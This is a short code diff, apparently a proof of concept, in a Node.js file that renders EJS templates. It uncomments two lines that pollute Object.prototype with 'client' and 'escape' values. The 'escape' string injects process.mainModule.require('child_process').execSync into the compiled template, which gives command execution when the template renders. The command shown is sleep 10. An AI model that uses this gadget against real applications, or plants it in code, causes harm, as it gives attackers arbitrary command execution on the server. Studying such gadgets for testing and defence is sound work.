@@ -2,8 +2,8 @@ const ejs = require('ejs')
 const path = require('path');
 const templatePath = path.join(__dirname, 'views', 'login_register.ejs');
 
-// Object.prototype.client = true
-// Object.prototype.escape = "false;\nprocess.mainModule.require('child_process').execSync(\`sleep 10\`)\n"
+Object.prototype.client = true
+Object.prototype.escape = "false;\nprocess.mainModule.require('child_process').execSync(\`sleep 10\`)\n"
 
 // Define the template string
 const templateString = `
